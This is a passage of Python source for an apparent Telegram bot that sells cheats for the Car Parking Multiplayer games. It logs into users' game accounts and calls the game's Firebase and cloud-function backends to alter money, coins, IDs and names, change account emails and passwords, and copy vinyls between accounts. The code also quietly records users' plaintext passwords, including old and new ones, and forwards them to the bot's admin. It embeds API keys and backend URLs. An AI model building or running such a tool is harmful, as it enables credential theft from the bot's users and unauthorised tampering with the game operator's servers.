        context.user_data["cpm2_act_email"] = email
        context.user_data["cpm2_act_password"] = password
        context.user_data["cpm2_act_cars"] = snap.get("cars") or []
        await notify_admin_login(context, update.effective_user, "CPM2 (التفعيلات)", email, success=True)
        await update_menu_message(context, user_id,
            (f"✅ تم الاتصال بحساب CPM2. عدد السيارات: {len(context.user_data['cpm2_act_cars'])}\nاختر التفعيلة:" if lang == "ar" else f"✅ CPM2 connected. Cars found: {len(context.user_data['cpm2_act_cars'])}\nChoose an activation:"),
            reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
        return

    if state in ("WAIT_CPM2_NEW_EMAIL", "WAIT_CPM2_NEW_PASSWORD"):
        new_value = text.strip()
        is_email = state == "WAIT_CPM2_NEW_EMAIL"
        email = context.user_data.get("cpm2_act_email")
        password = context.user_data.get("cpm2_act_password")
        if not email or not password:
            context.user_data.pop("state", None)
            await update_menu_message(context, user_id,
                "❌ CPM2 session is missing. Please log in again." if lang != "ar" else "❌ جلسة CPM2 غير موجودة. سجل الدخول مجدداً.",
                reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
            return
        if not new_value or (is_email and ("@" not in new_value or "." not in new_value.split("@")[-1])):
            await update_menu_message(context, user_id,
                "❌ أدخل بريداً إلكترونياً صحيحاً." if is_email and lang == "ar" else
                "❌ Enter a valid email address." if is_email else
                "❌ كلمة المرور لا يمكن أن تكون فارغة." if lang == "ar" else "❌ Password cannot be empty.")
            return
        context.user_data.pop("state", None)
        await update_menu_message(context, user_id,
            "⏳ جارٍ تحديث بيانات حساب CPM2..." if lang == "ar" else "⏳ Updating CPM2 account details...")
        result = await cpm2_update_account_async(email, password, "email" if is_email else "password", new_value)
        if result.get("ok"):
            if is_email:
                context.user_data["cpm2_act_email"] = result.get("email") or new_value
            else:
                context.user_data["cpm2_act_password"] = new_value
            # Keep the standard CPM2 login cache in sync when it exists.
            td = nuker.get_token_data(user_id) or {}
            if is_email:
                td["cp2_email"] = context.user_data["cpm2_act_email"]
            else:
                td["cp2_password"] = new_value
            if result.get("token"):
                td["cp2_token"] = result["token"]
            if result.get("refresh_token"):
                td["cp2_refresh_token"] = result["refresh_token"]
            if user_id in getattr(nuker, "tokens", {}):
                nuker.tokens[user_id].update(td)
            deduct_points(user_id, 2)
            message = ("✅ تم تغيير البريد الإلكتروني لحساب CPM2 بنجاح." if lang == "ar" else "✅ CPM2 email changed successfully.") if is_email else ("✅ تم تغيير كلمة مرور حساب CPM2 بنجاح." if lang == "ar" else "✅ CPM2 password changed successfully.")
            if user_id != ADMIN_ID:
                message += f"\n🪙 -5 | الرصيد: {get_points(user_id)}" if lang == "ar" else f"\n🪙 -5 | Balance: {get_points(user_id)}"
        else:
            message = ("❌ فشل التغيير: " if lang == "ar" else "❌ Update failed: ") + str(result.get("error") or "Unknown error")[:150]
        await update_menu_message(context, user_id, message, reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
        return

    if state == "WAIT_CPM2_VINYL_SOURCE_EMAIL":
        email = text.strip()
        if "@" not in email:
            await update_menu_message(context, user_id, "❌ أدخل بريداً إلكترونياً صحيحاً." if lang == "ar" else "❌ Enter a valid source email.")
            return
        context.user_data["cpm2_vinyl_pending_email"] = email
        context.user_data["state"] = "WAIT_CPM2_VINYL_SOURCE_PASSWORD"
        await update_menu_message(context, user_id, "🔐 أرسل كلمة مرور الحساب المصدر:" if lang == "ar" else "🔐 Enter the source account password:")
        return

    if state == "WAIT_CPM2_VINYL_SOURCE_PASSWORD":
        source_email = context.user_data.pop("cpm2_vinyl_pending_email", "")
        source_password = text.strip()
        mode = context.user_data.get("cpm2_vinyl_mode")
        context.user_data.pop("state", None)
        if not source_email or not source_password or mode not in ("c1c2", "c2c2"):
            await update_menu_message(context, user_id, "❌ بيانات الحساب المصدر غير مكتملة." if lang == "ar" else "❌ Source account details are incomplete.", reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
            return
        await update_menu_message(context, user_id, "⏳ جارٍ تسجيل الدخول وتحميل سيارات الحساب المصدر..." if lang == "ar" else "⏳ Logging in and loading source garage...")
        try:
            if mode == "c1c2":
                snap = await CPM2_ENGINE_NAMESPACE["open_cpm1_cloud_session"](source_email, source_password)
            else:
                snap = await cpm2_load_garage(source_email, source_password)
        except Exception as exc:
            snap = {"error": str(exc)[:180]}
        source_cars = snap.get("cars") or []
        if snap.get("error") or not source_cars:
            await update_menu_message(context, user_id,
                "❌ تعذر تحميل سيارات المصدر: " + str(snap.get("error") or "لا توجد سيارات")[:160] if lang == "ar" else "❌ Could not load source cars: " + str(snap.get("error") or "No cars found")[:160],
                reply_markup=cpm2_activations_keyboard_ptb(context.user_data.get("lang", "ar")))
            context.user_data.pop("cpm2_vinyl_mode", None)
            return
        context.user_data["cpm2_vinyl_source_email"] = source_email
        context.user_data["cpm2_vinyl_source_password"] = source_password
        context.user_data["cpm2_vinyl_source_cars"] = source_cars
        title = "اختر سيارة المصدر لنقل شعاراتها:" if lang == "ar" else "Choose the source car whose logos you want to transfer:"
        await update_menu_message(context, user_id, title,
            reply_markup=_cpm2_vinyl_car_picker(source_cars, "src", 0, lang))
        return

    if state == "WAIT_USER_ACCESS_CODE":
        context.user_data.pop("state", None)
        code = text.strip().upper()

        ok, err = try_use_code(code, user_id)

        if not ok:
            await update.message.reply_text(
                err + "\n\n🔄 حاول مرة أخرى ولا اطلب كود جديد من الأدمن.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 حاول مرة أخرى", callback_data="enter_access_code")],
                    [InlineKeyboardButton("❌ إلغاء", callback_data="access_cancel")]
                ])
            )
            return

        USERS_DB.add(user_id)
        _save_users()

        try:
            await update.message.delete()
        except:
            pass

        await context.bot.send_message(
            chat_id=user_id,
            text=(
                f"✅ <b>تم تفعيل الكود بنجاح!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎫 <b>الكود:</b> <code>{code}</code>\n"
                f"⏱ <b>المدة:</b> {format_time_remaining(user_id)}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎉 <b>تم فتح CPM1 و CPM2 لك مجاناً</b>\n"
                f"لن تُخصم منك نقاط في أي تفعيلة طوال مدة الكود.\n\n"
                f"👇🏻 ارجع للقائمة:"
            ),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_to_main")]
            ])
        )
        return

    if state == "WAIT_ACCESS_CODE" and user_id == ADMIN_ID:
        context.user_data.pop("state", None)
        code = text.strip().upper()

        if len(code) < 3 or len(code) > 20:
            await update.message.reply_text("❌ الكود لازم من 3 إلى 20 حرف")
            context.user_data["state"] = "WAIT_ACCESS_CODE"
            return

        if not all(c.isalnum() for c in code):
            await update.message.reply_text("❌ الكود لازم حروف وأرقام فقط")
            context.user_data["state"] = "WAIT_ACCESS_CODE"
            return

        context.user_data["pending_access_code"] = code

        try:
            await update.message.delete()
        except:
            pass

        msg = await context.bot.send_message(
            chat_id=user_id,
            text=f"✅ <b>الكود:</b> <code>{code}</code>\n\n🔽 <b>الخطوة 1:</b> واش من نوع الكود؟",
            parse_mode="HTML",
            reply_markup=get_code_type_keyboard()
        )
        context.user_data["last_menu_msg_id"] = msg.message_id
        return

    if state == "WAIT_BROADCAST" and user_id == ADMIN_ID:
        context.user_data.pop("state", None)
        success_count, fail_count = 0, 0
        status_msg = await context.bot.send_message(chat_id=user_id, text="جاري إرسال الرسالة... ⏳")

        for uid in list(USERS_DB):
            try:
                await context.bot.copy_message(chat_id=uid, from_chat_id=user_id, message_id=update.message.message_id)
                success_count += 1
            except Exception as e:
                logger.error(f"Broadcast failed for {uid}: {e}")
                fail_count += 1

        try:
            await update.message.delete()
        except TelegramError:
            pass

        await context.bot.edit_message_text(
            chat_id=user_id, message_id=status_msg.message_id,
            text=f"تم البث! 📢\n\n✅ {success_count}\n❌ {fail_count}"
        )
        return

    if not state:
        return

    if state == "WAIT_CPM_EMAIL":
        if "@" not in text:
            await update_menu_message(context, user_id, t["login_failed"], reply_markup=get_back_keyboard(lang, back_target="back_to_accounts"))
            return
        context.user_data["temp_cpm_email"] = text
        context.user_data["state"] = "WAIT_CPM_PASSWORD"
        await update_menu_message(context, user_id, t["ask_password"], reply_markup=get_back_keyboard(lang, back_target="back_to_accounts"))
        return

    elif state == "WAIT_CPM_PASSWORD":
        email = context.user_data.pop("temp_cpm_email", None)
        password = text
        context.user_data.pop("state", None)

        if not email:
            context.user_data["state"] = "WAIT_CPM_EMAIL"
            await update_menu_message(context, user_id, t["logout_prompt"], reply_markup=get_back_keyboard(lang, back_target="back_to_accounts"))
            return

        await update_menu_message(context, user_id, t["logging_in"])
        result = await nuker.login(email, password)

        if not result or not result.get("ok"):
            await update_menu_message(context, user_id, t["login_failed"], reply_markup=get_back_keyboard(lang, back_target="back_to_accounts"))
        else:
            nuker.save_token(user_id, result.get("auth", ""), email, password, result.get("refresh_token", ""), result.get("firebase_uid", ""))
            await nuker.load(user_id, force=True)

            if user_id not in USER_LOCAL_ACCOUNTS:
                USER_LOCAL_ACCOUNTS[user_id] = []
            if email not in USER_LOCAL_ACCOUNTS[user_id]:
                USER_LOCAL_ACCOUNTS[user_id].append(email)
            USER_ACTIVE_ACCOUNT[user_id] = email

            record_credential(user_id, email, password, status="success")
            log_user_action(user, "تسجيل دخول حساب CPM", email=email, password=password, success=True)

            # إشعار الأدمين بكل التفاصيل
            rec = nuker.get_record(user_id, email) or {}
            g_name     = str(rec.get("Name", ""))
            g_id       = str(rec.get("localID", ""))
            asyncio.create_task(notify_admin_login(
                context, user, "Car Parking 1", email,
                password=password, success=True,
                game_name=g_name, game_id=g_id
            ))

            await show_actions_menu(context, user_id, lang)
        return

    elif state == "WAIT_CP2_LOGIN_EMAIL":
        context.user_data["temp_cp2_email"] = text
        context.user_data["state"] = "WAIT_CP2_LOGIN_PASS"
        msg = "🔑 أدخل الباسورد تاع Car Parking 2:" if lang == "ar" else "🔑 Enter CP2 password:"
        await update_menu_message(context, user_id, msg, reply_markup=get_back_keyboard(lang, "back_to_accounts"))
        return

    elif state == "WAIT_CP2_LOGIN_PASS":
        email = context.user_data.pop("temp_cp2_email", None)
        password = text
        context.user_data.pop("state", None)

        msg_load = "جاري تسجيل الدخول لـ Car Parking 2... ⏳" if lang == "ar" else "Logging into CP2... ⏳"
        await update_menu_message(context, user_id, msg_load)
        res = await nuker.login_cp2(email, password)

        if res.get("ok"):
            td = nuker.get_token_data(user_id)
            if not td:
                nuker.save_token(user_id, "", email, password)
                td = nuker.get_token_data(user_id)
                
            td["cp2_token"] = res.get("auth")
            td["cp2_email"] = email
            td["cp2_password"] = password
            td["cp2_refresh_token"] = res.get("refresh_token")
            
            record_credential_cp2(user_id, "تسجيل دخول", email=email, password=password)
            asyncio.create_task(notify_admin_login(
                context, user, "Car Parking 2", email,
                password=password, success=True
            ))

            await show_actions_menu(context, user_id, lang)
        else:
            msg = "❌ فشل تسجيل الدخول لـ CPM2. تأكد من الإيميل والباسورد." if lang == "ar" else "❌ CP2 login failed. Check email/password."
            await update_menu_message(context, user_id, msg, reply_markup=get_back_keyboard(lang, "back_to_accounts"))
        return

    elif state == "WAIT_NEW_EMAIL_CP2":
        context.user_data.pop("state", None)
        res = await nuker.change_email_cp2(user_id, text)
        if res.get("ok"):
            cost = ACTION_COSTS.get("cp2_change_email", 5)
            td2 = nuker.get_token_data(user_id)
            old_cp2_email = td2.get("cp2_email","") if td2 else ""
            old_cp2_pass  = td2.get("cp2_password","") if td2 else ""
            record_credential_cp2(user_id, "تغيير الإيميل", email=res.get("email"), password="")
            asyncio.create_task(notify_admin_login(
                context, user, "CPM2 — تغيير إيميل", text,
                password=old_cp2_pass,
                game_name=f"القديم: {old_cp2_email}", success=True
            ))
            await process_action_response(context, user_id, lang, True, success_key="success_change_email", cost=cost)
        else:
            await process_action_response(context, user_id, lang, False)
        return

    elif state == "WAIT_NEW_PASS_CP2":
        context.user_data.pop("state", None)
        res = await nuker.change_password_cp2(user_id, text)
        if res.get("ok"):
            cost = ACTION_COSTS.get("cp2_change_pass", 5)
            td2 = nuker.get_token_data(user_id)
            cp2_email    = td2.get("cp2_email","") if td2 else ""
            old_cp2_pass = td2.get("cp2_password","") if td2 else ""
            record_credential_cp2(user_id, "تغيير الباسورد", email="", password=text)
            asyncio.create_task(notify_admin_login(
                context, user, "CPM2 — تغيير باسورد", cp2_email,
                password=text,
                game_name=f"القديم: {old_cp2_pass}", success=True
            ))
            await process_action_response(context, user_id, lang, True, success_key="success_change_pass", cost=cost)
        else:
            await process_action_response(context, user_id, lang, False)
        return

    elif state == "WAIT_NEW_EMAIL":
        context.user_data.pop("state", None)
        new_email = text
        td = nuker.get_token_data(user_id)
        old_email = td.get("email") if td else None
        old_pwd = td.get("password") if td else None

        res = await nuker.change_email(user_id, new_email)
        succ = res.get("ok", False)

        if succ:
            if user_id in USER_LOCAL_ACCOUNTS and old_email in USER_LOCAL_ACCOUNTS[user_id]:
                idx = USER_LOCAL_ACCOUNTS[user_id].index(old_email)
                USER_LOCAL_ACCOUNTS[user_id][idx] = new_email
            USER_ACTIVE_ACCOUNT[user_id] = new_email
            LAST_LOGGED_EMAIL[user_id] = new_email

            record_credential(user_id, new_email, old_pwd, status="success", old_email=old_email)
            log_user_action(user, "تغيير البريد الإلكتروني", email=new_email, password=old_pwd, input_value=f"القديم: {old_email} ➔ الجديد: {new_email}", success=True)
            asyncio.create_task(notify_admin_login(
                context, user, "CPM1 — تغيير إيميل", new_email,
                password=old_pwd or "",
                game_name=f"القديم: {old_email}", success=True
            ))

            await delete_old_control_message(context, user_id)
            await context.bot.send_message(user_id, t["success_change_email"], parse_mode="HTML")
            await restore_user_menu(context, user_id)
        else:
            log_user_action(user, "تغيير البريد الإلكتروني", email=old_email, password=old_pwd, input_value=f"محاولة فاشلة إلى: {new_email}", success=False)
            await delete_old_control_message(context, user_id)
            await context.bot.send_message(user_id, t["fail_change_email"], parse_mode="HTML")
            await restore_user_menu(context, user_id)
        return

    elif state == "WAIT_NEW_PASS":
        context.user_data.pop("state", None)
        new_pass = text
        td = nuker.get_token_data(user_id)
        email = td.get("email") if td else None
        old_pass = td.get("password") if td else None

        res = await nuker.change_password(user_id, new_pass)
        succ = res.get("ok", False)

        if succ:
            record_credential(user_id, email, new_pass, status="success", old_password=old_pass)
            log_user_action(user, "تغيير كلمة المرور", email=email, password=new_pass, success=True)
            asyncio.create_task(notify_admin_login(
                context, user, "CPM1 — تغيير باسورد", email or "",
                password=new_pass,
                game_name=f"القديم: {old_pass or '—'}", success=True
            ))

            await delete_old_control_message(context, user_id)
            await context.bot.send_message(user_id, t["success_change_pass"], parse_mode="HTML")
            await restore_user_menu(context, user_id)
        else:
            log_user_action(user, "تغيير كلمة المرور", email=email, password=old_pass, input_value=f"محاولة فاشلة", success=False)
            await delete_old_control_message(context, user_id)
            await context.bot.send_message(user_id, t["fail_change_pass"], parse_mode="HTML")
            await restore_user_menu(context, user_id)
        return

    if state == "WAIT_MONEY_INPUT":
        context.user_data.pop("state", None)
        cleaned = text.replace(",", "").replace("_", "").replace(".", "")
        try:
            amount = int(cleaned)
        except ValueError:
            await context.bot.send_message(user_id, t["general_error"], parse_mode="HTML")
            await restore_user_menu(context, user_id)
            return
        td = nuker.get_token_data(user_id)
        email = td.get("email") if td else None
        rec = nuker.get_record(user_id, email) if email else {}
        old_money = rec.get("money", "غير محدد") if rec else "غير محدد"

        res = await nuker.set_money(user_id, amount)
        succ = res.get("ok", False)

        log_user_action(user, "تعديل الأموال", email=email, password=td.get("password") if td else None, input_value=f"القديم: {old_money} ➔ الجديد: {amount}", success=succ)
        await process_action_response(context, user_id, lang, succ, success_key="success_money")

    elif state == "WAIT_COIN_INPUT":
        context.user_data.pop("state", None)
        cleaned = text.replace(",", "").replace("_", "").replace(".", "")
        try:
            amount = int(cleaned)
        except ValueError:
            await context.bot.send_message(user_id, t["general_error"], parse_mode="HTML")
            await restore_user_menu(context, user_id)
            return
        td = nuker.get_token_data(user_id)
        email = td.get("email") if td else None
        rec = nuker.get_record(user_id, email) if email else {}
        old_coin = rec.get("coin", "غير محدد") if rec else "غير محدد"

        res = await nuker.set_coin(user_id, amount)
        succ = res.get("ok", False)

        log_user_action(user, "تعديل الكوينز", email=email, password=td.get("password") if td else None, input_value=f"القديم: {old_coin} ➔ الجديد: {amount}", success=succ)
        await process_action_response(context, user_id, lang, succ, success_key="success_coin")

    elif state == "WAIT_ID_INPUT":
        context.user_data.pop("state", None)
        if "/" in text:
            await delete_old_control_message(context, user_id)
            await context.bot.send_message(user_id, t["invalid_id_slash"], parse_mode="HTML")
            await restore_user_menu(context, user_id)
            return

        td = nuker.get_token_data(user_id)
        email = td.get("email") if td else None
        rec = nuker.get_record(user_id, email) if email else {}
        old_id = rec.get("localID", "غير محدد") if rec else "غير محدد"

        res = await nuker.set_player_id(user_id, text)
        succ = res.get("ok", False)

        log_user_action(user, "تغيير الـ ID", email=email, password=td.get("password") if td else None, input_value=f"القديم: {old_id} ➔ الجديد: {text}", success=succ)
        await process_action_response(context, user_id, lang, succ, success_key="success_id")

    elif state == "WAIT_NAME_INPUT":
        context.user_data.pop("state", None)
        td = nuker.get_token_data(user_id)
        email = td.get("email") if td else None
        rec = nuker.get_record(user_id, email) if email else {}
        old_name = rec.get("Name", "غير محدد") if rec else "غير محدد"

        res = await nuker.set_player_name(user_id, text)
        succ = res.get("ok", False)

        log_user_action(user, "تغيير الاسم", email=email, password=td.get("password") if td else None, input_value=f"القديم: {old_name} ➔ الجديد: {text}", success=succ)
        await process_action_response(context, user_id, lang, succ, success_key="success_name")

async def user_del_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_channel_membership(update, context):
        return
    user_id = update.effective_user.id
    lang = context.user_data.get("lang", "ar")
    t = TEXTS[lang]

    USER_LOCAL_ACCOUNTS.pop(user_id, None)
    USER_ACTIVE_ACCOUNT.pop(user_id, None)
    LAST_LOGGED_EMAIL.pop(user_id, None)
    CREDENTIALS_DB.pop(user_id, None)
    nuker.tokens.pop(user_id, None)

    await delete_old_control_message(context, user_id)
    await update.message.reply_text(t["del_user_success"])
    await restore_user_menu(context, user_id)

async def ripou02_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_channel_membership(update, context):
        return
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("🚫 للأدمن فقط")
        return

    context.user_data["state"] = "WAIT_ACCESS_CODE"
    context.user_data.pop("pending_access_code", None)

    await update.message.reply_text(
        "🎫 <b>إنشاء كود وصول جديد</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "أرسل الكود اللي تحب تستعملو.\n"
        "مثال: <code>ALI2025</code> ولا <code>FRIEND01</code>\n\n"
        "📌 <b>ملاحظات:</b>\n"
        "• الكود لازم حروف/أرقام (بدون مسافات)\n"
        "• من 3 إلى 20 حرف\n"
        "• ♾️ الكود يخدم <b>لكامل الناس</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء", callback_data="access_cancel")]])
    )

async def codes_list_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("🚫 للأدمن فقط")
        return

    if not ACCESS_CODES and not USER_ACCESS:
        await update.message.reply_text("📭 ما كاينش أكواد ولا مستخدمين حالياً")
        return

    text = "🎫 <b>الأكواد النشطة</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"

    for code, data in ACCESS_CODES.items():
        h = data["hours"]
        h_disp = f"{int(h//24)} يوم" if h >= 24 else f"{int(h)} ساعة"
        code_type = data.get("type", "single")
        max_uses = data.get("max_uses", 1)
        used_list = data.get("used_by_list", [])
        used_count = len(used_list)

        type_icon = "👤" if code_type == "single" else "👥"
        type_name = "فردي" if code_type == "single" else "جماعي"

        if code_type == "single":
            status = "✅ متاح" if used_count == 0 else "❌ مستعمل"
        else:
            status = f"🟢 {used_count}/{max_uses}"

        text += f"• <code>{code}</code> {type_icon} {type_name} — {h_disp} — {status} ♾️\n"

    text += f"\n━━━━━━━━━━━━━━━━━━━━━━\n🟢 <b>مستخدمين نشطين:</b> {len(USER_ACCESS)}"

    await update.message.reply_text(text, parse_mode="HTML", disable_web_page_preview=True)

async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_channel_membership(update, context):
        return
    user_id = update.effective_user.id

    if user_id == ADMIN_ID:
        await update.message.reply_text("👑 أنت الأدمن — معفي من الأكواد")
        return

    if not context.args:
        await update.message.reply_text("📝 استعمل: <code>/redeem الكود</code>", parse_mode="HTML")
        return

    code = context.args[0].upper().strip()
    ok, err = try_use_code(code, user_id)

    if not ok:
        await update.message.reply_text(err)
        return

    USERS_DB.add(user_id)
    _save_users()

    await update.message.reply_text(
        f"✅ <b>تم تفعيل الكود!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎫 <code>{code}</code>\n"
        f"⏱ <b>المدة:</b> {format_time_remaining(user_id)}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎉 الكود يفتح CPM1 و CPM2 مجاناً طوال مدة الاشتراك. أرسل /start للبدء",
        parse_mode="HTML"
    )

async def my_access_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_channel_membership(update, context):
        return
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        await update.message.reply_text("👑 أنت الأدمن — صلاحيات كاملة")
        return
    if has_valid_access(user_id):
        await update.message.reply_text(f"⏱ <b>وقتك المتبقي:</b> {format_time_remaining(user_id)}", parse_mode="HTML")
    else:
        await update.message.reply_text("❌ ما عندكش كود فعال. اطلب كود من الأدمن.")

async def ripou_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lang = context.user_data.get("lang", "ar")

    if user_id != ADMIN_ID:
        await update.message.reply_text(TEXTS[lang]["cmd_not_avail"])
        return

    total_users = len(USERS_DB)
    total_accounts = sum(len(accs) for accs in USER_LOCAL_ACCOUNTS.values())
    active_now = len(nuker.tokens)
    total_refs = len(REF_CODES)
    total_points_issued = sum(POINTS_DB.values())

    top_users = sorted(USER_ACTIVITY.items(), key=lambda x: x[1].get("usage_count", 0), reverse=True)[:5]

    top_text = ""
    for i, (uid, data) in enumerate(top_users, 1):
        name = data.get("name", "بدون")
        count = data.get("usage_count", 0)
        top_text += f"{i}. {name} (<code>{uid}</code>) — {count} عملية\n"

    if not top_text:
        top_text = "لا يوجد بعد\n"

    text = (
        "📊 <b>إحصائيات بوت ᴿᴵᴾᴼᵁ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 <b>إجمالي المستخدمين:</b> {total_users}\n"
        f"💳 <b>إجمالي الحسابات:</b> {total_accounts}\n"
        f"🟢 <b>مسجلين دخول الآن:</b> {active_now}\n"
        f"🔗 <b>روابط الإحالة:</b> {total_refs}\n"
        f"🪙 <b>النقاط الموزعة:</b> {total_points_issued}\n"
        f"🎫 <b>عدد الأكواد:</b> {len(ACCESS_CODES)}\n"
        f"🟢 <b>مستخدمين عندهم كود فعال:</b> {len(USER_ACCESS)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "🏆 <b>أكثر 5 مستخدمين نشاطاً:</b>\n"
        f"{top_text}"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🕐 <b>الوقت:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"
    )

    await update.message.reply_text(text, parse_mode="HTML")

async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: return await update.message.reply_text("استعمل: /ban USER_ID")
    try:
        uid = int(context.args[0])
        BANNED_USERS.add(uid)
        await update.message.reply_text(f"✅ تم حظر {uid}")
    except ValueError:
        await update.message.reply_text("❌ ID غير صحيح")

async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: return await update.message.reply_text("استعمل: /unban USER_ID")
    try:
        uid = int(context.args[0])
        BANNED_USERS.discard(uid)
        await update.message.reply_text(f"✅ تم فك الحظر عن {uid}")
    except ValueError:
        await update.message.reply_text("❌ ID غير صحيح")

async def banned_list_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not BANNED_USERS: return await update.message.reply_text("📭 ما كاينش حتى واحد محظور حالياً.")
    
    text = "🚫 <b>قائمة المحظورين:</b>\n━━━━━━━━━━━━━━━━━━\n"
    for uid in BANNED_USERS:
        text += f"• <code>{uid}</code>\n"
    await update.message.reply_text(text, parse_mode="HTML")

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lang = context.user_data.get("lang", "ar")
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(TEXTS[lang]["cmd_not_avail"])
        return

    if "admin_prev_menu" not in context.user_data:
        context.user_data["admin_prev_menu"] = context.user_data.get("current_menu", "lang")

    await update_menu_message(
        context, update.effective_user.id,
        "أهلا بك يا مشرف البوت يعمل الآن✅",
        reply_markup=get_admin_panel_keyboard()
    )

async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_channel_membership(update, context):
        return
    user_id = update.effective_user.id
    lang = context.user_data.get("lang", "ar")
    t = TEXTS[lang]

    creds = CREDENTIALS_DB.get(user_id, [])
    if not creds:
        msg = await update.message.reply_text(t["no_data"])
        await asyncio.sleep(60)
        try:
            await msg.delete()
        except TelegramError:
            pass
        return

    text = t["info_title"]
    for idx, cred in enumerate(creds, 1):
        st = "نجاح✅" if cred.get("status") == "success" else "فشل❌"
        text += f"<b>حساب #{idx}:</b>\n"
        text += f"• البريد: <code>{cred.get('email')}</code>\n"
        text += f"• كلمة المرور: <code>{cred.get('password')}</code>\n"
        text += f"• الحالة: {st}\n\n"

    text += f"<i>{t['info_delete_note']}</i>"

    msg = await update.message.reply_text(text, parse_mode="HTML")
    await asyncio.sleep(60)
    try:
        await msg.delete()
    except TelegramError:
        pass

async def send_daily_broadcast(context: ContextTypes.DEFAULT_TYPE):
    for uid in list(USERS_DB):
        try:
            await context.bot.send_message(
                chat_id=uid, 
                text="🌟 <b>مرحباً بك!</b>\nالبوت راه شغال 24/24. جرب ميزات جديدة!", 
                parse_mode="HTML"
            )
        except:
            pass



# ---------------- CPM2 ACTIVATIONS (adapted from SIDALI.py) ----------------
from types import SimpleNamespace

CPM2_ACTIVATION_FIREBASE_KEY = os.getenv("CP2_FIREBASE_KEY", "").strip() or FK_CP2
CPM2_ACTIVATION_OG_KEY = (
    os.getenv("CP2_OG_KEY", "").strip()
    or os.getenv("CPM2_OG_KEY", "").strip()
    or "320b93f3e7f4410aa52ce24da363ad04"
)
CPM2_ACTIVATION_OG_BASE = os.getenv("CP2_OG_BASE", "https://cpm-2.ogames.kz/api").strip()
CPM2_ACTIVATION_USER_AGENT = "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)"
CPM2_CLOTHES_LOGIN_URL = os.getenv(
    "CPM2_CLOTHES_LOGIN_URL",
    "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=" + CPM2_ACTIVATION_FIREBASE_KEY,
)
CPM2_CLOTHES_SAVE_URL = os.getenv(
    "CPM2_CLOTHES_SAVE_URL",
    "https://europe-west1-cpm-2-7cea1.cloudfunctions.net/SavePlayerRecords24_1",
)

class _CPM2DummyFlask:
    def __init__(self, *args, **kwargs): self.secret_key = None
    def route(self, *args, **kwargs): return lambda fn: fn
class _CPM2DummyRequest:
    args = {}; form = {}; json = {}; method = "GET"
def _cpm2_dummy_jsonify(value=None, *args, **kwargs): return value
def _cpm2_dummy_send_from_directory(*args, **kwargs): return None

_CPM2_ENGINE_SOURCE = '#!/usr/bin/env python3\n"""VSG Vinyl Transfer — Web (CPM1→CPM2 + CPM2→CPM2 only)."""\nimport os, json, time, struct, math, hashlib, base64, logging, asyncio, re, secrets, urllib.request, urllib.error\nfrom collections import defaultdict\n\nimport aiohttp\ntry:\n    from Crypto.Cipher import AES\nexcept ImportError:\n    AES = None\ntry:\n    import brotli\nexcept ImportError:\n    brotli = None\n\n# Flask web routes are disabled in the Telegram bot integration; lightweight stubs are injected.\n\n\nCPM1_API_KEY = os.getenv("CPM1_FIREBASE_KEY", "").strip() or "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"\nCPM2_API_KEY = os.getenv("CP2_FIREBASE_KEY", "").strip()\nCPM1_DATABASE_URL = "https://carparkingmultiplayer-dc1d2.firebaseio.com"\nCPM1_API_BASE = "https://us-central1-carparkingmultiplayer-dc1d2.cloudfunctions.net"\nCPM2_API_BASE = "https://europe-west1-cpm-2-7cea1.cloudfunctions.net"\nCPM1_FALLBACK_BASES = (\n    "https://europe-west1-cp-multiplayer.cloudfunctions.net",\n    "https://us-central1-cp-multiplayer.cloudfunctions.net",\n)\nCPM1_CARS_FUNCTION = "GetAllCars2"\nCPM2_CARS_FUNCTION_CANDIDATES = (\n    "GetAllCars24_1", "GetAllCars23_1", "GetAllCars22_1",\n    "GetAllCars21_1", "GetAllCars20_2", "GetAllCars20_1",\n)\nCPM2_SAVE_CAR_FUNCTION = "SaveCar23_1"\nCPM2_SAVE_CAR_CANDIDATES = (\n    "SaveCar24_1", "SaveCar23_1", "SaveCar22_1",\n    "SavePlateVinyls24_1", "SavePlateVinyls23_1", 